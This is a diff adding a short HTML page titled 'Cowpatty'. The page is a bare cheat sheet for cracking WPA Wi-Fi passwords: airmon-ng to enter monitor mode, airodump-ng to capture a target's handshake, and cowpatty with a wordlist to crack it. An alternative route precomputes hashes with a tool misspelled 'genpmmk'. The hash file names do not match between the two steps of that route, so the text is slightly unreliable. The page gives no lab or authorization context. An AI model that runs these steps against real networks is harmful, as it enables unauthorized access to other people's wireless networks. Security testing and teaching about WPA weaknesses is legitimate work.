@@ -1,0 +1,18 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Cowpatty</title>
+</head><body>Monitor mode<br/>
+&nbsp;&#09;airmon-ng start wlan0<br/>
+Capture<br/>
+&nbsp;&#09;airodump-ng --bssid &lt;bssid&gt; -c &lt;channel&gt; -w cowpatty mon0<br/>
+Crack after WPA handshake<br/>
+&nbsp;&#09;cowpatty -f &lt;wordlist&gt; -r &lt;cowcrack.cap&gt; -s &lt;ssid&gt;<br/>
+<br/>
+OR <br/>
+<br/>
+Get a hash<br/>
+&nbsp;&#09;genpmmk -f &lt;wordlist&gt; -d hashes -s &lt;ssid&gt;<br/>
+&nbsp;Crack<br/>
+&nbsp;&#09;cowpatty -d hashfile -r &lt;cowcrack.cap&gt; -s &lt;ssid&gt;</body></html>
